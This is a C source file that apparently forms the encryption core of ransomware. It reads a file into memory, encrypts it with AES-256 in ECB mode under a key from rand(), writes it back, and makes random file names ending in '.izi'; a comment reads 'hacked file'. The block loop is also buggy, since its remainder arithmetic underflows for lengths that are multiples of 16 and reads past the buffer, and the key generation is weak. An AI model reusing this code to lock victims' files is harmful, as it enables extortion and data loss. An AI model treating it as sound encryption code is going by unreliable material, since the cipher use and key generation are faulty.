#include <stdio.h>
#include <stdlib.h>
#include "file.h"
#include "aes256.h"

#define DUMP(s, buf, sz)  {printf(s);                   \
                              for (int i = 0; i < (sz);i++)    \
                                  printf("%02x ", buf[i]); \
                              printf("\n");}

#define GEN_KEY(buf, sz)  {for (int i = 0; i < (sz);i++)    \
                                  buf[i] = rand(); }
#define KEYLEN 16


int read_entry(File *file){
  FILE *fileStream;
	fileStream = fopen(file->name, "rb+");
	if (!fileStream)
	{
		fprintf(stderr, "Unable to open file %s", file->name);
		return -1;
	}
	fseek(fileStream, 0, SEEK_END);
	file->fileLen=ftell(fileStream);
	fseek(fileStream, 0, SEEK_SET);

	file->buffer= (uint8_t	*) malloc( (file->fileLen));
	if (!file->buffer)
	{
		fprintf(stderr, "Memory error!");
    fclose(fileStream);
		return -2;
  }

  fread(file->buffer, 1, file->fileLen, fileStream);
  fclose(fileStream);
  return 0;
}

int write_entry(File *file, char *name){
  FILE* f = fopen(name, "wb");
  if(f == NULL)
  {
      fprintf(stderr, "File opening error\n");
      return -1;
  }
  fwrite(file->buffer, 1, file->fileLen, f);
  fclose(f);
  return 0;
}

void file_entry_decrypt(File *file){

  const unsigned long remainders = (file->fileLen % KEYLEN) - 1;
  register const unsigned long absoluteSize = file->fileLen - remainders;
  register unsigned long i;
  register uint8_t j, in[16];
  for(i = 0; i < absoluteSize; i += KEYLEN){
    for (j = 0; j < 16; j++)
    {
      in[j] = file->buffer[i + j];
    }
    aes256_decrypt_ecb(&file->ctx, in);
    for (j = 0; j < 16; j++)
    {
      file->buffer[i + j] = in[j];
    }
  }
}
static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#'?!";

char *mkrndstr(size_t length) {
  char *randomString;

  if (length) {
    randomString = malloc(length +5); // sizeof(char) == 1, cf. C99

    if (randomString) {
        int l = (int) (sizeof(charset) -1);
        int key;
        for (int n = 0;n < length;n++) {
            key = rand() % l;
            randomString[n] = charset[key];
        }
        randomString[length+3] = 'i';
        randomString[length+2] = 'z';
        randomString[length+1] = 'i';
        randomString[length] = '.';
        randomString[length+4] = '\0';
    }
  }

  return randomString;
}

void file_encrypt(File *file){
  GEN_KEY(file->encryption_key, sizeof(file->encryption_key));
  aes256_init(&file->ctx, file->encryption_key);
  //DUMP("Buffer: ", file->buffer, sizeof(file->buffer)*10);

  const unsigned long remainders = (file->fileLen % KEYLEN) - 1;
  register const unsigned long absoluteSize = file->fileLen - remainders;
  register unsigned long i;
  register uint8_t j, in[16];


  for(i = 0; i < absoluteSize; i += KEYLEN){
    for (j = 0; j < 16; j++)
    {
      in[j] = file->buffer[i + j];
    }
    aes256_encrypt_ecb(&file->ctx, in);
    for (j = 0; j < 16; j++)
    {
      file->buffer[i + j] = in[j];
    }

  }
  //DUMP("key: ", file->encryption_key, sizeof(file->encryption_key)); hacked file
  //DUMP("Buffer: ", file->buffer, sizeof(file->buffer)*100);

}
